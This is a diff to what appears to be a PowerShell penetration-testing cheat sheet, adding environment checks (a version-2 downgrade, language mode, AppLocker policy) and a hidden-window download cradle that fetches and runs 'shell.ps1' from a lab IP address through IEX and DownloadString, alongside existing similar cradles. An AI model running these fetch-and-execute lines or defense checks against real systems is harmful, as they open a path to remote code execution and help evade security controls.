@@ -23,6 +23,12 @@ Function
 `Get-Alias -Name ps`
 `Get-Alias -Definition Get-Process`
 
+## Check Environment
+
+- Version info: `powershell -v 2.0 -c $psversiontable`
+- Language mode: `$host.runspace.languagemode`
+- Check if AppLocker is enabled: `Get-AppLockerPolicy -Local`
+
 ## Download Files
 ```
 powershell wget "http://example.com/abc.txt" -outfile "abc.txt"
@@ -50,6 +56,12 @@ powershell wget "http://example.com/abc.txt" -outfile "abc.txt"
 - `Invoke-Expression (New-Object Net.WebClient).DownloadString('http://example.com/example.ps1');`
 - `iex (New-Object Net.WebClient).DownloadString('http://example.com/example.ps1');`
 - `powershell -EncodedCommand <Base64EncodedCommand>`
+
+```
+START /B ​ ""​ powershell -c IEX (​ New-Object
+Net.Webclient).downloadstring(​ 'http://10.10.14.2/shell.ps1'​ )
+```
+_/B prevents creation of a new window_
 
 - Craft Download Cradles: https://github.com/danielbohannon/Invoke-CradleCrafter
 
